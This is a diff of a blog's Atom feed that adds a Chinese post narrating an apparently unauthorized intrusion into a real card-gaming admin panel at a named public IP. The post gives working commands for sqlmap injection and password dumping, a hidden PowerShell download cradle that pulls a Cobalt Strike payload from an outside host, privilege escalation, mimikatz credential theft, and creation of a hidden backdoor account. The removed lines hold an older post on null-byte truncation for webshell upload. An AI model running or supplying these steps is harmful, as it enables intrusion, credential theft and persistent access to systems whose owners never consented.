@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-09-15T06:42:10.532Z</updated>
+  <updated>2020-09-21T10:57:09.853Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,25 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一次简单棋牌后台渗透</title>
+    <link href="http://yoursite.com/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/"/>
+    <id>http://yoursite.com/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/</id>
+    <published>2020-09-20T08:33:56.000Z</published>
+    <updated>2020-09-21T10:57:09.853Z</updated>
+    
+    <content type="html"><![CDATA[<p>看到有许多文章搞这种棋牌后台管理系统，就自己尝试一波。</p><p>先用shodan搜索相关网站</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/shodan.png" alt></p><p>找到一个和文章中类似的管理后台</p><p><a href="http://61.160.211.35:84/Login/index" target="_blank" rel="noopener">http://61.160.211.35:84/Login/index</a></p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E5%90%8E%E5%8F%B0.png" alt></p><p>抓包看到</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E6%8A%93%E5%8C%85.png" alt></p><p>可以得到存在帐号admin，也可能存在注入</p><a id="more"></a><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E6%B3%A8%E5%85%A5.png" alt></p><p>先尝试暴力破解密码</p><p>果然没跑出来</p><p>把抓包得到的保存下来用sqlmap跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;1.txt&quot; -dbs</span><br></pre></td></tr></table></figure><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/dbs.png" alt></p><p>看到manager</p><p>跑表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;1.txt&quot; -D &quot;RYPlatformManagerDB&quot; --tables</span><br></pre></td></tr></table></figure><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/tables.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;1.txt&quot; -D &quot;RYPlatformManagerDB&quot; -T &quot;Base_Users&quot; --columns</span><br></pre></td></tr></table></figure><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/columnes.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;1.txt&quot; -D &quot;RYPlatformManagerDB&quot; -T &quot;Base_Users&quot; -C &quot;Password&quot; --dump</span><br></pre></td></tr></table></figure><p>尝试直接解密MD5，失败</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/password.png" alt></p><p>去在线md5解密平台，成功解密。</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/md5.png" alt></p><p>登录成功</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86.png" alt></p><p>没找到上传点</p><p>尝试用sqlmap的–os-shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;1.txt&quot; --os-shell</span><br></pre></td></tr></table></figure><p>看ipconfig</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/ipconfig.png" alt></p><p>用cs上线</p><p>powershell远程执行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://xxx.xxx.xxx.xxx:80/a&apos;))&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/powershell.png" alt></p><p>然后进行提权</p><p>systeminfo</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/systeminfo.png" alt></p><p>200多个补丁</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用windows-exploit-suggester.py脚本，查找系统未打补丁有哪些，脚本下载地址：https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./windows-exploit-suggester.py --database 2020-09-21-mssb.xls --systeminfo 1.txt</span><br></pre></td></tr></table></figure><p>看到有ms16-075</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E8%A1%A5%E4%B8%81.png" alt></p><p>ms16-075漏洞简介</p><p>Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p><p>用<a href="https://github.com/DeEpinGh0st/Erebus这个插件" target="_blank" rel="noopener">https://github.com/DeEpinGh0st/Erebus这个插件</a></p><p>直接提权</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E6%8F%92%E4%BB%B6.png" alt></p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F.png" alt></p><p>用sweet-potato</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/system.png" alt></p><p>抓取密码hashdump和mimikatz</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E5%AF%86%E7%A0%81.png" alt></p><p>发现未开启3389端口</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell tasklist /svc  查找termservice服务，该服务就是远程桌面系统，登3389的</span><br><span class="line">svchost.exe   2000   TermService</span><br><span class="line">shell netstat -ano |find &quot;2000&quot;</span><br></pre></td></tr></table></figure><p>发现是2016端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -f -a 16 61.160.211.35:2016</span><br></pre></td></tr></table></figure><p>创建个隐藏账号就好了，输入shell net user goest$ 123123 /add goest$ </p><p>远程连接成功</p><p><img src="/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/3386.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;看到有许多文章搞这种棋牌后台管理系统，就自己尝试一波。&lt;/p&gt;&lt;p&gt;先用shodan搜索相关网站&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/shodan.png&quot; alt&gt;&lt;/p&gt;&lt;p&gt;找到一个和文章中类似的管理后台&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://61.160.211.35:84/Login/index&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://61.160.211.35:84/Login/index&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E5%90%8E%E5%8F%B0.png&quot; alt&gt;&lt;/p&gt;&lt;p&gt;抓包看到&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/2020/09/20/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%A3%8B%E7%89%8C%E5%90%8E%E5%8F%B0%E6%B8%97%E9%80%8F/%E6%8A%93%E5%8C%85.png&quot; alt&gt;&lt;/p&gt;&lt;p&gt;可以得到存在帐号admin，也可能存在注入&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>ATT&amp;CK红队评估实战靶场</title>
@@ -446,27 +465,6 @@
       &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2548&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux反弹shell（一）文件描述符与重定向&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2549&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux 反弹shell（二）反弹shell的本质&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;文件描述符&quot;&gt;&lt;a href=&quot;#文件描述符&quot; class=&quot;headerlink&quot; title=&quot;文件描述符&quot;&gt;&lt;/a&gt;&lt;strong&gt;文件描述符&lt;/strong&gt;&lt;/h2&gt;&lt;blockquote&gt;
 &lt;p&gt;&lt;strong&gt;linux文件描述符&lt;/strong&gt;：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。&lt;/p&gt;
 &lt;/blockquote&gt;
-    
-    </summary>
-    
-    
-      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>00截断</title>
-    <link href="http://yoursite.com/2020/04/21/00%E6%88%AA%E6%96%AD/"/>
-    <id>http://yoursite.com/2020/04/21/00%E6%88%AA%E6%96%AD/</id>
-    <published>2020-04-21T14:44:25.000Z</published>
-    <updated>2020-09-08T11:44:52.191Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_26090065/article/details/81458937" target="_blank" rel="noopener">00截断原理分析</a> </p><h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>比如</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p><a id="more"></a><p>加上%00</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p><p>就绕过了后缀限制，可以上传webshell啦。</p><h1 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h1><p> 然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00： </p><h1 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php 00截断"></a>php 00截断</h1><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><p>include和require一般在网站内部读取文件</p><p>file_get_contents一般用于打开一个url或一个文件</p><p>file_exists判断文件是否存在</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_26090065/article/details/81458937&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;00截断原理分析&lt;/a&gt; &lt;/p&gt;&lt;h1 id=&quot;00截断&quot;&gt;&lt;a href=&quot;#00截断&quot; class=&quot;headerlink&quot; title=&quot;%00截断&quot;&gt;&lt;/a&gt;%00截断&lt;/h1&gt;&lt;p&gt;在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束&lt;/p&gt;&lt;p&gt;比如&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://mp.csdn.net/upfiles/?filename=test.txt&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.csdn.net/upfiles/?filename=test.txt&lt;/a&gt;                                此时输出的是test.txt&lt;/p&gt;
     
     </summary>
     
